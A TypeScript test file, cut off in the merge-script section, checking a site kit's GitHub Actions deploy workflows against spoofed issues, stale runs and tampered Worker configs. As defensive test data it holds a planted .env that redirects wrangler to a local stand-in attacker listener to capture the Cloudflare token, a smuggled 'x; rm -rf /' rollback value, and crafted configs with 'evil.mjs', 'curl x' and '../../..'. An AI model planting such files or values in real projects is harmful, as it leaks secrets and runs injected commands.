/**
 * The site workflows after the reviews of their first build (10.1, 10.2, 14.1). Each test reproduces one way that
 * an agent, a person with write access or anyone who can open an issue could get past the workflow, and shows that
 * the workflow now stops it:
 *
 * - wrangler reads no `.env` of the checkout and talks only to `api.cloudflare.com` (with the real wrangler and a
 *   local listener in place of an attacker's host);
 * - `.env*`, `.dev.vars*` and `.wrangler/` are protected paths, and `config-wrangler` fails a committed one;
 * - the rollback gate, the alert and the close steps count only the issues of the workflow, on every page, and only
 *   the owner lifts the hold (with a fake GitHub);
 * - every run on `main` waits in one queue, only the head of `main` deploys, and a rollback deploys the version that
 *   ran before;
 * - the built Worker config is checked against an allowlist of its keys;
 * - the merge script requires an agent pusher and agent commits;
 * - every job that holds a secret checks its checkout first.
 *
 * No test reaches GitHub, npm or Cloudflare.
 */
import assert from 'node:assert/strict';
import { execFile, spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { createServer } from 'node:http';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { test } from 'node:test';
import { fileURLToPath } from 'node:url';
import { parse } from 'yaml';
import { checkWrangler, renderWrangler, WRANGLER_FILE } from '../../src/hosts/cloudflare.ts';
import { BASE_DEPENDENCIES, FORMS_DEPENDENCIES, ISLANDS_DEPENDENCIES } from '../../src/project.ts';
import { getRule, Report } from '../../src/registry.ts';
import {
  CODEOWNERS_FILE,
  checkProtectedFiles,
  DEPENDABOT_FILE,
  renderCodeOwners,
  renderProtected,
  renderSiteMergeWorkflow,
  renderSiteWorkflow,
  SITE_MERGE_FILE,
  SITE_WORKFLOW_FILE,
} from '../../src/shims.ts';
import type { FakeState, Item } from './fake-github.ts';
import { inTemp } from './fixtures.ts';
import { optionsOf } from './project-fixtures.ts';
import { BOT, bash, github, issueOf, lines, scratch } from './site-scripts.ts';
import { SPEC, specBlock } from './spec.ts';

interface Step {
  name?: string;
  id?: string;
  if?: string;
  uses?: string;
  run?: string;
  env?: Record<string, string>;
}
interface Job {
  name?: string;
  needs?: string | string[];
  if?: string;
  permissions?: Record<string, string>;
  concurrency?: { group: string; 'cancel-in-progress'?: boolean };
  outputs?: Record<string, string>;
  steps: Step[];
}
interface Workflow {
  concurrency: { group: string; 'cancel-in-progress': string };
  jobs: Record<string, Job>;
}

const SITE = parse(renderSiteWorkflow()) as Workflow;
const MERGE = parse(renderSiteMergeWorkflow()) as Workflow;
const TEMPLATES = fileURLToPath(new URL('../../templates/', import.meta.url));
const KIT = fileURLToPath(new URL('../..', import.meta.url));
const expression = (name: string): string => `\${{ ${name} }}`;

const job = (id: string): Job => {
  const found = SITE.jobs[id] ?? MERGE.jobs[id];
  if (!found) throw new Error(`the site workflows have no job ${id}`);
  return found;
};
const step = (id: string, name: string): Step => {
  const found = job(id).steps.find((entry) => entry.name === name);
  if (!found) throw new Error(`the job ${id} has no step ${name}`);
  return found;
};
const runOf = (id: string, name: string): string => step(id, name).run ?? '';
/** The values of a step's env that hold no expression: the ones that a test can pass as they are. */
const plainEnv = (entry: Step): Record<string, string> =>
  Object.fromEntries(Object.entries(entry.env ?? {}).filter(([, value]) => !value.includes('${{')));

/** Issues of other titles, so that the issue of a test stands on a later page. */
const filler = (from: number, count: number): Item[] =>
  Array.from({ length: count }, (_, index) => issueOf(from + index, `other ${from + index}`));

// The rollback gate, the alert and the close steps

const GATE = runOf('deploy', 'Rollback gate');
const ALERT = specBlock('**Alert step**', 'sh');
const CLOSE = specBlock('**Close step**', 'sh');
const ROLLBACK = 'rollback: production';
const HELD = 'deployed=false\n';

test('the gate, the alert and the close steps are the exact blocks of 10.1, and every alert step runs the alert block', () => {
  assert.equal(GATE, `${specBlock('- **Rollback gate**', 'sh')}\n`);
  for (const [id, name] of [
    ['build-alert', 'Alert'],
    ['smoke', 'Alert'],
    ['rollback', 'Alert'],
    ['rollback', 'Alert the failed rollback'],
  ] as const) {
    assert.equal(runOf(id, name), `${ALERT}\n`, `${id}: ${name}`);
  }
  for (const id of ['build-alert', 'smoke']) assert.equal(runOf(id, 'Close'), `${CLOSE}\n`, id);
  assert.deepEqual(step('deploy', 'Rollback gate').env, {
    GH_TOKEN: expression('github.token'),
    KIT_OWNER: expression('vars.KIT_OWNER'),
  });
  // The gate reopens an issue, so the deploy job may write issues.
  assert.equal(job('deploy').permissions?.issues, 'write');
});

test('the gate holds nothing for a pull request or an issue of another account with the title of a hold', () => {
  const spoofs = [
    issueOf(7, ROLLBACK, { pull_request: { url: 'x' }, user: { login: 'random-user' } }),
    issueOf(8, ROLLBACK, { user: { login: 'random-user' } }),
    issueOf(9, 'rollback failed: production', { pull_request: { url: 'y' }, user: BOT }),
  ];
  const result = github(GATE, { issues: spoofs });
  assert.equal(result.status, 0, result.out);
  assert.equal(result.output, '', result.out);
  assert.deepEqual(result.calls, [], 'no wait and no reopen');
});

test('the gate reads every page: an open rollback issue behind 150 newer issues holds the deploy', () => {
  const result = github(GATE, { issues: [issueOf(1, ROLLBACK), ...filler(2, 150)] });
  assert.equal(result.status, 0, result.out);
  assert.equal(result.output, HELD);
  assert.deepEqual(result.calls, ['sleep 30']);
  assert.match(result.out, /nothing deploys until the owner closes the issue "rollback: production"/);
});

test('an issue that the agent closed is reopened with a comment, and that run deploys nothing', () => {
  const closed = issueOf(5, ROLLBACK, { state: 'closed', closed_by: { login: 'site-agent' } });
  const result = github(GATE, { issues: [closed, ...filler(6, 3)] });
  assert.equal(result.status, 0, result.out);
  assert.equal(result.output, HELD);
  assert.deepEqual(result.calls, [
    'sleep 30',
    'issue reopen 5 --repo o/r --comment Reopened by https://github.com/o/r/actions/runs/1: only the owner lifts the hold, by closing this issue.',
  ]);
  assert.equal(result.after.issues?.find((item) => item.number === 5)?.state, 'open');
  // The next run finds it open, and holds again.
  const next = github(GATE, result.after);
  assert.equal(next.output, HELD);
});

test('an issue that the owner closed lifts the hold, and only the newest issue of each title counts', () => {
  const owner = { state: 'closed' as const, closed_by: { login: 'owner' } };
  const old = { state: 'closed' as const, closed_by: { login: 'github-actions[bot]' } };
  const result = github(GATE, {
    issues: [issueOf(2, ROLLBACK, old), issueOf(5, ROLLBACK, owner), issueOf(3, 'rollback failed: production', owner)],
  });
  assert.equal(result.status, 0, result.out);
  assert.equal(result.output, '');
  assert.deepEqual(result.calls, []);
  // Without KIT_OWNER no close lifts the hold.
  const noOwner = github(GATE, { issues: [issueOf(5, ROLLBACK, owner)] }, { KIT_OWNER: '' });
  assert.equal(noOwner.output, HELD);
});

test('the gate deploys when the owner closes the issue within 30 seconds, and holds on rollback failed too', () => {
  const closing = github(GATE, { issues: [issueOf(4, ROLLBACK)], closeOnSleep: [4] });
  assert.equal(closing.status, 0, closing.out);
  assert.deepEqual(closing.calls, ['sleep 30']);
  assert.equal(closing.output, '');
  const failed = github(GATE, { issues: [issueOf(4, 'rollback failed: production')] });
  assert.equal(failed.output, HELD);
});

test('only the run of the head of main deploys: a run behind a newer merge, or a re-run, fails before anything', () => {
  const result = github(GATE, { main: 'def', issues: [] });
  assert.equal(result.status, 1);
  assert.equal(result.out, '::error::main has moved on since this run started: only the run of its head deploys\n');
  assert.deepEqual(result.calls, []);
});

test('the alert step comments only on an open issue of the workflow, on any page', () => {
  const env = { TITLE: ROLLBACK, BODY: 'Smoke failed.' };
  const spoof = github(
    ALERT,
    { issues: [issueOf(7, ROLLBACK, { pull_request: { url: 'x' }, user: { login: 'x' } })] },
    env,
  );
  assert.equal(spoof.status, 0, spoof.out);
  assert.deepEqual(spoof.calls, [
    'issue create --repo o/r --title rollback: production --assignee owner --body Smoke failed. https://github.com/o/r/actions/runs/1',
  ]);
  const paged = github(ALERT, { issues: [issueOf(1, ROLLBACK), ...filler(2, 120)] }, env);
  assert.deepEqual(paged.calls, [
    'issue comment 1 --repo o/r --body Failed again: https://github.com/o/r/actions/runs/1',
  ]);
});

test('the close step closes only an issue of the workflow, never a pull request or an issue of another account', () => {
  const env = { TITLE: 'main: build failed', COMMENT: 'Fixed by abc' };
  const spoofs = [
    issueOf(7, 'main: build failed', { pull_request: { url: 'x' }, user: { login: 'site-agent' } }),
    issueOf(8, 'main: build failed', { user: { login: 'site-agent' } }),
  ];
  const result = github(CLOSE, { issues: spoofs }, env);
  assert.equal(result.status, 0, result.out);
  assert.deepEqual(result.calls, []);
  const real = github(CLOSE, { issues: [issueOf(3, 'main: build failed'), ...spoofs, ...filler(10, 110)] }, env);
  assert.deepEqual(real.calls, ['issue close 3 --repo o/r --comment Fixed by abc']);
});

test('a failed rollback opens rollback failed: production, and the four titles are those of 10.1', () => {
  const failed = step('rollback', 'Alert the failed rollback');
  assert.equal(failed.if, 'failure()');
  assert.equal(failed.env?.TITLE, 'rollback failed: production');
  assert.equal(
    failed.env?.BODY,
    `Smoke failed after the deploy of ${expression('github.sha')}, and the rollback failed too. Production may run that version.`,
  );
  assert.equal(job('rollback').steps.at(-1), failed);
  assert.equal(
    SPEC.includes(
      'The four titles are `main: build failed`, `smoke: production`, `rollback: production` and `rollback failed: production`.',
    ),
    true,
  );
});

// The order of the runs

type Context = Record<string, string | boolean | undefined>;

/**
 * Evaluates a GitHub expression of the forms that the concurrency settings use: context names, string literals,
 * `==`, `!=`, `!`, `&&`, `||` and parentheses. `&&` and `||` give one of their operands, as in GitHub.
 */
function evaluate(text: string, context: Context): string | boolean | undefined {
  const tokens = text.match(/'[^']*'|&&|\|\||==|!=|!|\(|\)|[\w.-]+/g) ?? [];
  let at = 0;
  const peek = (): string | undefined => tokens[at];
  const primary = (): string | boolean | undefined => {
    const token = tokens[at++] ?? '';
    if (token === '(') {
      const value = or();
      at++;
      return value;
    }
    if (token === '!') return !primary();
    if (token.startsWith("'")) return token.slice(1, -1);
    return context[token];
  };
  const compare = (): string | boolean | undefined => {
    const left = primary();
    if (peek() === '==' || peek() === '!=') {
      const op = tokens[at++];
      const right = primary();
      return op === '==' ? left === right : left !== right;
    }
    return left;
  };
  const and = (): string | boolean | undefined => {
    let left = compare();
    while (peek() === '&&') {
      at++;
      const right = compare();
      left = left ? right : left;
    }
    return left;
  };
  const or = (): string | boolean | undefined => {
    let left = and();
    while (peek() === '||') {
      at++;
      const right = and();
      left = left ? left : right;
    }
    return left;
  };
  return or();
}

/** A text with `${{ }}` expressions, evaluated. */
const render = (text: string, context: Context): string =>
  text.replace(/\$\{\{(.*?)\}\}/g, (_, inner: string) => String(evaluate(inner, context)));

const MAIN = 'refs/heads/main';
const RUNS: Record<string, Context> = {
  push: { 'github.event_name': 'push', 'github.ref': MAIN },
  dispatch: { 'github.event_name': 'workflow_dispatch', 'github.ref': MAIN, 'inputs.protected': false },
  protected: { 'github.event_name': 'workflow_dispatch', 'github.ref': MAIN, 'inputs.protected': true },
  schedule: { 'github.event_name': 'schedule', 'github.ref': MAIN },
  branch: { 'github.event_name': 'push', 'github.ref': 'refs/heads/agent/x' },
};

test('every push run and deploy dispatch on main waits in one queue and cancels nothing; a branch push cancels', () => {
  const group = (run: string): string => render(SITE.concurrency.group, RUNS[run] ?? {});
  const cancels = (run: string): string => render(SITE.concurrency['cancel-in-progress'], RUNS[run] ?? {});
  assert.equal(group('push'), 'site-run-refs/heads/main');
  assert.equal(group('dispatch'), group('push'), 'the event does not matter on main');
  assert.equal(group('protected'), 'site-protected-refs/heads/main');
  assert.equal(group('schedule'), 'site-schedule-refs/heads/main');
  assert.equal(group('branch'), 'site-run-refs/heads/agent/x');
  assert.deepEqual(['push', 'dispatch', 'protected', 'schedule', 'branch'].map(cancels), [
    'false',
    'false',
    'false',
    'false',
    'true',
  ]);
  assert.equal(SPEC.includes(`- Concurrency \`${SITE.concurrency.group}\`, with \`cancel-in-progress: `), true);
});

test('deploy, the smoke after a deploy and rollback share deploy-production; a scheduled smoke stays out of it', () => {
  const groupOf = (id: string, run: string): string => render(job(id).concurrency?.group ?? '', RUNS[run] ?? {});
  for (const id of ['deploy', 'smoke', 'rollback']) {
    assert.equal(groupOf(id, 'push'), 'deploy-production', id);
    assert.equal(groupOf(id, 'dispatch'), 'deploy-production', id);
    assert.equal(job(id).concurrency?.['cancel-in-progress'], false, id);
  }
  assert.equal(groupOf('smoke', 'schedule'), 'smoke-schedule');
});

const LIVE_ID = '11111111-2222-4333-8444-555555555555';

test('deploy records the live version before it uploads, and gives it as the job output live', () => {
  const names = job('deploy').steps.map((entry) => entry.name);
  assert.ok(names.indexOf('The live version') > names.indexOf('Config check'));
  assert.ok(names.indexOf('The live version') < names.indexOf('Upload the version'));
  assert.equal(job('deploy').outputs?.live, expression('steps.live.outputs.id'));
  assert.equal(runOf('deploy', 'The live version'), `${specBlock('- **The live version**', 'sh')}\n`);
  const status = (printed: string, code: number) =>
    scratch({ npx: `echo "npx $*" >> "$LOG"; printf '%s' '${printed}'; exit ${code}\n` }, (work, env) => {
      writeFileSync(join(work, WRANGLER_FILE), renderWrangler(STATIC));
      const result = bash(runOf('deploy', 'The live version'), work, env);
      const output = existsSync(env.GITHUB_OUTPUT ?? '') ? readFileSync(env.GITHUB_OUTPUT ?? '', 'utf8') : '';
      return { result, output, calls: lines(env.LOG ?? ''), temp: env.RUNNER_TEMP ?? '' };
    });
  const one = status(JSON.stringify({ versions: [{ version_id: LIVE_ID, percentage: 100 }] }), 0);
  assert.equal(one.result.status, 0, one.result.stderr);
  assert.equal(one.output, `id=${LIVE_ID}\n`);
  assert.deepEqual(one.calls, [
    `npx --no wrangler deployments status --name example-ch --json --env-file ${one.temp}/empty.env`,
  ]);
  const split = status(
    JSON.stringify({
      versions: [
        { version_id: LIVE_ID, percentage: 50 },
        { version_id: LIVE_ID, percentage: 50 },
      ],
    }),
    0,
  );
  assert.equal(split.result.status, 1);
  assert.match(split.result.stdout, /production does not run one version at 100%/);
  const first = status('', 1);
  assert.equal(first.result.status, 0, 'the first deploy has no live version');
  assert.equal(first.output, '');
  assert.match(first.result.stdout, /No live version/);
});

test('the rollback deploys exactly the version that ran before the deploy, and nothing without it', () => {
  const rollback = step('rollback', 'Roll production back');
  assert.equal(rollback.run, `${specBlock('**Rollback step**', 'sh')}\n`);
  assert.equal(rollback.env?.LIVE, expression('needs.deploy.outputs.live'));
  const roll = (live: string) =>
    scratch({ npx: 'echo "npx $*" >> "$LOG"\n' }, (work, env) => {
      writeFileSync(join(work, WRANGLER_FILE), renderWrangler(STATIC));
      const result = bash(rollback.run ?? '', work, {
        ...env,
        LIVE: live,
        RUN: 'https://github.com/o/r/actions/runs/1',
      });
      return { result, calls: lines(env.LOG ?? ''), temp: env.RUNNER_TEMP ?? '' };
    });
  const ok = roll(LIVE_ID);
  assert.equal(ok.result.status, 0, ok.result.stderr);
  assert.deepEqual(ok.calls, [
    `npx --no wrangler rollback ${LIVE_ID} --name example-ch --message smoke failed: https://github.com/o/r/actions/runs/1 -y --env-file ${ok.temp}/empty.env`,
  ]);
  for (const live of ['', 'x; rm -rf /', `${LIVE_ID} --name other`]) {
    const refused = roll(live);
    assert.equal(refused.result.status, 1, live);
    assert.equal(
      refused.result.stdout,
      '::error::the deploy recorded no live version: there is nothing to roll back to\n',
      live,
    );
    assert.deepEqual(refused.calls, [], live);
  }
});

// wrangler and the files of the checkout

const STATIC = optionsOf({
  site: 'https://example.ch',
  codeOwner: '@example-owner',
  locales: [{ code: 'de', tag: 'de-CH', name: 'Deutsch' }],
  defaultLocale: 'de',
  legal: { legalNote: { de: '/impressum/' }, privacy: { de: '/datenschutz/' } },
  securityContact: 'mailto:security@example.ch',
});

/** Every step that runs wrangler, by job and name. */
const WRANGLER_STEPS = Object.entries({ ...SITE.jobs }).flatMap(([id, found]) =>
  found.steps.filter((entry) => entry.run?.includes('npx --no wrangler')).map((entry) => ({ id, step: entry })),
);

test('every wrangler command reads an empty env file, and every wrangler step talks to api.cloudflare.com only', () => {
  assert.deepEqual(
    WRANGLER_STEPS.map(({ id, step: entry }) => `${id}/${entry.name}`),
    [
      'preview/Upload the preview version',
      'deploy/The live version',
      'deploy/Upload the version',
      'deploy/Deploy the version',
      'rollback/Roll production back',
    ],
  );
  for (const { id, step: entry } of WRANGLER_STEPS) {
    const where = `${id}/${entry.name}`;
    assert.equal(entry.env?.CLOUDFLARE_API_BASE_URL, 'https://api.cloudflare.com/client/v4', where);
    const run = entry.run ?? '';
    const commands = run.split('\n').filter((line) => line.includes('npx --no wrangler'));
    for (const line of commands) assert.match(line, /--env-file "\$RUNNER_TEMP\/empty\.env"/, `${where}: ${line}`);
    assert.ok(run.indexOf(': > "$RUNNER_TEMP/empty.env"') >= 0, where);
    assert.ok(run.indexOf(': > "$RUNNER_TEMP/empty.env"') < run.indexOf('npx --no wrangler'), where);
  }
});

/** A listener in place of an attacker's host: it counts what reaches it. */
async function listener(): Promise<{ url: string; hits: string[]; close: () => Promise<void> }> {
  const hits: string[] = [];
  const server = createServer((request, response) => {
    hits.push(`${request.method} ${request.url} ${request.headers.authorization ?? ''}`);
    response.setHeader('content-type', 'application/json');
    response.end(
      JSON.stringify({ success: false, errors: [{ code: 10000, message: 'x' }], messages: [], result: null }),
    );
  });
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const { port } = server.address() as AddressInfo;
  return {
    url: `http://127.0.0.1:${port}/client/v4`,
    hits,
    close: () => new Promise((resolve) => server.close(() => resolve())),
  };
}

const runAsync = (script: string, cwd: string, env: Record<string, string>) =>
  new Promise<{ code: number; out: string }>((resolve) => {
    execFile(
      'bash',
      ['--noprofile', '--norc', '-eo', 'pipefail', '-c', script],
      { cwd, env, timeout: 90_000 },
      (error, stdout, stderr) => resolve({ code: error ? Number(error.code ?? 1) : 0, out: `${stdout}${stderr}` }),
    );
  });

test('with the real wrangler, a committed .env does not get the Cloudflare token sent to another host', async () => {
  const wrangler = join(KIT, 'node_modules/.bin/wrangler');
  assert.ok(existsSync(wrangler), 'the kit installs wrangler for this test');
  const attacker = await listener();
  const dir = mkdtempSync(join(tmpdir(), 'astro-kit-envfile-'));
  try {
    const work = join(dir, 'site');
    mkdirSync(join(work, 'dist'), { recursive: true });
    mkdirSync(join(dir, 'tmp'));
    symlinkSync(join(KIT, 'node_modules'), join(work, 'node_modules'));
    writeFileSync(join(work, WRANGLER_FILE), renderWrangler(STATIC));
    writeFileSync(join(work, 'dist/index.html'), '<!doctype html><title>x</title>');
    for (const name of ['.env', '.env.local', '.env.preview', '.env.production']) {
      writeFileSync(join(work, name), `CLOUDFLARE_API_BASE_URL=${attacker.url}\n`);
    }
    const env: Record<string, string> = {
      PATH: process.env.PATH ?? '',
      HOME: dir,
      RUNNER_TEMP: join(dir, 'tmp'),
      GITHUB_OUTPUT: join(dir, 'output'),
      CI: 'true',
      WRANGLER_SEND_METRICS: 'false',
      CLOUDFLARE_API_TOKEN: 'SECRET-TOKEN-123',
      CLOUDFLARE_ACCOUNT_ID: '0123456789abcdef0123456789abcdef',
      // No request leaves the machine: api.cloudflare.com is reached through a proxy that refuses every connection.
      HTTPS_PROXY: 'http://127.0.0.1:9',
      https_proxy: 'http://127.0.0.1:9',
      NO_PROXY: '127.0.0.1,localhost',
      no_proxy: '127.0.0.1,localhost',
      SHA: 'abc',
      RUN: 'https://github.com/o/r/actions/runs/1',
      BRANCH: 'agent/x',
      ALIAS: 'b-0123456789',
      CONFIG: WRANGLER_FILE,
      ID: LIVE_ID,
      LIVE: LIVE_ID,
    };
    for (const { id, step: entry } of WRANGLER_STEPS) {
      const result = await runAsync(entry.run ?? '', work, { ...env, ...plainEnv(entry) });
      // No step reaches Cloudflare here; the live version step goes on without a live version.
      const failed = entry.name === 'The live version' ? /No live version/.test(result.out) : result.code !== 0;
      assert.ok(failed, `${id}/${entry.name}: ${result.out}`);
      assert.doesNotMatch(result.out, /Unknown argument/i, `${id}/${entry.name}`);
      assert.deepEqual([...attacker.hits], [], `${id}/${entry.name}`);
    }
    // The empty env file alone keeps the .env out, also with no CLOUDFLARE_API_BASE_URL in the environment.
    const alone = await runAsync(runOf('rollback', 'Roll production back'), work, env);
    assert.notEqual(alone.code, 0);
    assert.deepEqual([...attacker.hits], []);
    // Without it, wrangler reads the .env and sends the token there: the attack that this test stands against.
    const without = await runAsync('npx --no wrangler rollback --name example-ch -y', work, env);
    assert.notEqual(without.code, 0);
    assert.ok(
      attacker.hits.some((hit) => hit.endsWith('Bearer SECRET-TOKEN-123')),
      without.out,
    );
  } finally {
    await attacker.close();
    rmSync(dir, { recursive: true, force: true });
  }
});

const FORBIDDEN = [
  '.env',
  '.env.local',
  'sub/.env.production',
  '.dev.vars',
  'x/.dev.vars.preview',
  '.wrangler/deploy/config.json',
  'a/.wrangler/state/v3/x',
];

test('.env*, .dev.vars* and .wrangler/ are protected paths of the push ruleset and of CODEOWNERS, at any depth', () => {
  const { rulesets } = JSON.parse(readFileSync(join(TEMPLATES, 'github-org-rulesets.json'), 'utf8')) as {
    rulesets: { rules: { type: string; parameters?: { restricted_file_paths?: string[] } }[] }[];
  };
  const paths = rulesets.flatMap((ruleset) =>
    ruleset.rules.flatMap((rule) => rule.parameters?.restricted_file_paths ?? []),
  );
  for (const pattern of ['.env*', '**/.env*', '.dev.vars*', '**/.dev.vars*', '.wrangler/**', '**/.wrangler/**']) {
    assert.equal(paths.includes(pattern), true, pattern);
  }
  assert.equal(SPEC.includes(`- \`file_path_restriction\`: ${paths.map((path) => `\`${path}\``).join(', ')}.`), true);
  const owners = renderCodeOwners('@o').split('\n');
  for (const line of ['.env* @o', '.dev.vars* @o', '.wrangler/ @o']) assert.equal(owners.includes(line), true, line);
});

test('config-wrangler fails a .env, .dev.vars or .wrangler file that git tracks, at any depth', () => {
  const git = (root: string, ...args: string[]) =>
    spawnSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@e', ...args], { cwd: root, encoding: 'utf8' });
  const findings = (planted: Record<string, string>, track: readonly string[], repo = true) =>
    inTemp({ [WRANGLER_FILE]: renderWrangler(STATIC), ...planted }, (root) => {
      if (repo) {
        git(root, 'init', '-q');
        git(root, 'add', '-f', '--', WRANGLER_FILE, ...track);
      }
      const report = new Report();
      checkWrangler(root, STATIC, report);
      return report.findings.map((finding) => `${finding.rule} ${finding.where}: ${finding.detail}`);
    });
  const files = Object.fromEntries([...FORBIDDEN, 'src/env.ts', 'docs/wrangler.md'].map((path) => [path, 'X=1\n']));
  assert.deepEqual(
    findings(files, [...FORBIDDEN, 'src/env.ts']),
    [...FORBIDDEN]
      .sort()
      .map(
        (path) =>
          `config-wrangler ${path}: git tracks this file, and wrangler reads it: remove it with git rm --cached`,
      ),
  );
  // A file that git does not track, such as the .wrangler/ of a forms build, passes; so does a folder outside git.
  assert.deepEqual(findings(files, []), []);
  assert.deepEqual(findings(files, [], false), []);
  // The rule reads the folder of the project inside a larger work tree, as the test site inside the kit.
  const nested = inTemp({ 'site/.env': 'X=1\n', [`site/${WRANGLER_FILE}`]: renderWrangler(STATIC) }, (root) => {
    git(root, 'init', '-q');
    git(root, 'add', '-f', '--', 'site/.env');
    const report = new Report();
    checkWrangler(join(root, 'site'), STATIC, report);
    return report.findings.map((finding) => finding.where);
  });
  assert.deepEqual(nested, ['.env']);
  assert.equal(getRule('config-wrangler').standard.includes('Git tracks no other file that wrangler reads'), true);
});

// The built Worker config

const CONFIG_CHECK = runOf('deploy', 'Config check');
const PREVIEW_CHECK = runOf('preview', 'Check the built preview config');
const CHECK = step('deploy', 'Config check').env?.CHECK ?? '';
const BUILT = JSON.parse(readFileSync(new URL('./built-worker-config.json', import.meta.url), 'utf8')) as {
  production: Record<string, unknown>;
  preview: Record<string, unknown>;
};
const SITE_WRANGLER = readFileSync(new URL('../site/wrangler.jsonc', import.meta.url), 'utf8');

function built(target: 'production' | 'preview', value: unknown) {
  return scratch({}, (work, env) => {
    mkdirSync(join(work, 'dist/server'), { recursive: true });
    writeFileSync(join(work, 'astro-kit.json'), JSON.stringify({ features: { forms: true } }));
    writeFileSync(join(work, WRANGLER_FILE), SITE_WRANGLER);
    writeFileSync(join(work, 'dist/server/wrangler.json'), typeof value === 'string' ? value : JSON.stringify(value));
    const script = target === 'production' ? CONFIG_CHECK : PREVIEW_CHECK;
    const result = bash(script, work, { ...env, CHECK });
    const output = existsSync(env.GITHUB_OUTPUT ?? '') ? readFileSync(env.GITHUB_OUTPUT ?? '', 'utf8') : '';
    return { status: result.status, out: `${result.stdout}${result.stderr}`, output };
  });
}

test('the Worker config check is the exact jq program of 10.1 in both steps, with the key lists of the adapter', () => {
  assert.equal(CHECK, `${specBlock('**Worker config check.**', 'jq')}\n`);
  assert.equal(step('preview', 'Check the built preview config').env?.CHECK, CHECK);
  // Every key that the adapter writes for either target is in one of the three lists.
  const listed: string[] = CHECK.match(/[A-Za-z0-9_]+/g) ?? [];
  for (const key of new Set([...Object.keys(BUILT.production), ...Object.keys(BUILT.preview)])) {
    assert.equal(listed.includes(key), true, key);
  }
});

test('the real built configs of the forms test site pass, for production and for the preview', () => {
  const production = built('production', BUILT.production);
  assert.equal(production.status, 0, production.out);
  assert.equal(production.output, 'config=dist/server/wrangler.json\n');
  const preview = built('preview', BUILT.preview);
  assert.equal(preview.status, 0, preview.out);
  // The production config is no preview config: it holds the mail binding and the rate limits.
  assert.equal(built('preview', BUILT.production).status, 1);
});

test('the Worker config check fails every binding, key and asset setting that wrangler.jsonc does not give', () => {
  const p = BUILT.production;
  const assets = p.assets as Record<string, unknown>;
  const differ = (keys: string) => `::error::the built Worker config differs from wrangler.jsonc in ${keys}\n`;
  const binding = (keys: string) =>
    `::error::the built Worker config holds a binding that wrangler.jsonc does not name: ${keys}\n`;
  const unknown = '::error::the built Worker config holds a key that the kit does not know\n';
  const cases: [string, 'production' | 'preview', unknown, string][] = [
    [
      'a service binding to another Worker',
      'production',
      { ...p, services: [{ binding: 'O', service: 'other-site' }] },
      binding('services'),
    ],
    ['an R2 bucket', 'production', { ...p, r2_buckets: [{ binding: 'B', bucket_name: 'b' }] }, binding('r2_buckets')],
    [
      'a D1 database',
      'production',
      { ...p, d1_databases: [{ binding: 'D', database_id: 'x' }] },
      binding('d1_databases'),
    ],
    [
      'a Durable Object of another Worker',
      'production',
      { ...p, durable_objects: { bindings: [{ name: 'D', class_name: 'X', script_name: 'other' }] } },
      binding('durable_objects'),
    ],
    ['a variable', 'production', { ...p, vars: { A: '1' } }, binding('vars')],
    [
      'two at once',
      'production',
      { ...p, vars: { A: '1' }, queues: { producers: [{ binding: 'Q' }], consumers: [] } },
      binding('queues, vars'),
    ],
    ['a KV binding', 'production', { ...p, kv_namespaces: [{ binding: 'KV', id: 'x' }] }, binding('kv_namespaces')],
    ['a tail consumer', 'production', { ...p, tail_consumers: [{ service: 'attacker-tail' }] }, unknown],
    ['another account', 'production', { ...p, account_id: 'f'.repeat(32) }, unknown],
    ['an unknown key', 'production', { ...p, zzz: 1 }, unknown],
    [
      'the asset folder of the whole runner',
      'production',
      { ...p, assets: { ...assets, directory: '../../..' } },
      differ('assets'),
    ],
    ['another html handling', 'production', { ...p, assets: { ...assets, html_handling: 'none' } }, differ('assets')],
    [
      'run_worker_first true and another name',
      'production',
      { ...p, name: 'other', assets: { ...assets, run_worker_first: true } },
      differ('assets, name'),
    ],
    ['another entry', 'production', { ...p, main: 'evil.mjs' }, differ('main')],
    ['bundling', 'production', { ...p, no_bundle: false }, differ('no_bundle')],
    ['other module rules', 'production', { ...p, rules: [{ type: 'Text', globs: ['**/*'] }] }, differ('rules')],
    ['no main at all', 'production', (({ main: _main, ...rest }) => rest)(p), differ('main')],
    [
      'another mail address',
      'production',
      { ...p, send_email: [{ name: 'EMAIL', allowed_destination_addresses: ['a@evil.example'] }] },
      differ('send_email'),
    ],
    [
      'a build command',
      'production',
      { ...p, build: { command: 'curl x' } },
      '::error::the built Worker config holds a build command\n',
    ],
    ['no object', 'production', [], '::error::the built Worker config is not a JSON object\n'],
    ['no JSON', 'production', '{ not json', '::error::the built Worker config is not a JSON object\n'],
    [
      'a preview with a service binding to production',
      'preview',
      { ...BUILT.preview, services: [{ binding: 'P', service: 'laerchenwald-example' }] },
      binding('services'),
    ],
    [
      'a preview with the mail binding',
      'preview',
      { ...BUILT.preview, send_email: p.send_email },
      differ('send_email'),
    ],
    ['a preview with the production name', 'preview', { ...BUILT.preview, name: p.name }, differ('name')],
    [
      'a preview of the runner folder',
      'preview',
      { ...BUILT.preview, assets: { ...assets, directory: '../../..' } },
      differ('assets'),
    ],
    ['a preview that is no object', 'preview', '"x"', '::error::the built Worker config is not a JSON object\n'],
    ['a preview that is no JSON', 'preview', '{', '::error::the built Worker config is not a JSON object\n'],
  ];
  for (const [name, target, value, message] of cases) {
    const result = built(target, value);
    assert.equal(result.status, 1, `${name}: ${result.out}`);
    assert.equal(result.out, message, name);
    assert.equal(result.output, '', name);
  }
});

test("the reviewer's crafted configs fail: services, r2, d1, durable_objects, vars, tail_consumers and ../../..", () => {
  const p = BUILT.production;
  const crafted = {
    ...p,
    assets: { ...(p.assets as object), directory: '../../..' },
    services: [{ binding: 'OTHER', service: 'other-client-site' }],
    r2_buckets: [{ binding: 'B', bucket_name: 'other-client-uploads' }],
    d1_databases: [{ binding: 'DB', database_id: 'x', database_name: 'other' }],
    vars: { A: '1' },
    durable_objects: { bindings: [{ name: 'D', class_name: 'X', script_name: 'other-client-site' }] },
  };
  assert.equal(
    built('production', crafted).out,
    '::error::the built Worker config holds a binding that wrangler.jsonc does not name: d1_databases, durable_objects, r2_buckets, services, vars\n',
  );
  assert.equal(built('production', { ...crafted, tail_consumers: [{ service: 't' }] }).status, 1);
});

// The merge script

const MERGE_SCRIPT = specBlock('**Merge script**', 'sh');

interface MergeCase {
  author?: string;
  actor?: string;
  pr?: string;
  runs?: string[];
  commits?: (string | null)[];
